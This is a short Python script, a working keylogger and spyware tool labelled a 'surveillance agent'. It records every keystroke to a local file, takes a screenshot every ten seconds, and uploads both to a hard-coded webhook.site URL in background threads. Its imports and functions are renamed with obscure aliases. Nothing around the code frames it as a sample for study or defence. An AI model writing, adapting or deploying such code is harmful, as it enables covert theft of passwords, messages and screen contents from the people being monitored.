from pynput.keyboard import Listener as bone
import pyautogui
import logging as tandav
import threading as sena
import time as wakt
import requests as pratishtha
import io
from datetime import datetime

__version__ = "3.0.0"

# Webhook URL (same for both)
WEBHOOK_URL = "https://webhook.site/1e1672bc-e70b-4eee-a955-fbfd75312b47"
KEYLOG_FILE = "patra.txt"
CAPTURE_INTERVAL = 10  # seconds

# --- Keylogger Thread ---
def karm():
    tandav.basicConfig(filename=KEYLOG_FILE, level=tandav.INFO, format="%(message)s")

    def on_press(key):
        try:
            tandav.info(str(key))
        except:
            pass

    with bone(on_press=on_press) as bruno:
        bruno.join()

# --- Screenshot Capture Thread ---
def netra():
    while True:
        wakt.sleep(CAPTURE_INTERVAL)
        try:
            screenshot = pyautogui.screenshot()
            img_bytes = io.BytesIO()
            screenshot.save(img_bytes, format='PNG')
            img_bytes.seek(0)

            files = {
                'file': (f'screenshot_{datetime.now().isoformat()}.png', img_bytes, 'image/png')
            }

            res = pratishtha.post(WEBHOOK_URL, files=files)
            print(f"[Screenshot] Sent: {res.status_code}")
        except Exception as e:
            print(f"[Screenshot] Error: {e}")

# --- Keylog Sender Thread ---
def astra():
    while True:
        wakt.sleep(10)
        try:
            with open(KEYLOG_FILE, 'r') as file:
                content = file.read()

            files = {
                'file': ('keystrokes.txt', content)
            }

            res = pratishtha.post(WEBHOOK_URL, files=files)
            print(f"[Keylog] Sent: {res.status_code}")
        except Exception as e:
            print(f"[Keylog] Error: {e}")

# --- Main ---
if __name__ == "__main__":
    print("Starting surveillance agent...")

    sena.Thread(target=karm, daemon=True).start()
    sena.Thread(target=astra, daemon=True).start()
    sena.Thread(target=netra, daemon=True).start()

    # Keep main thread alive
    while True:
        wakt.sleep(1)
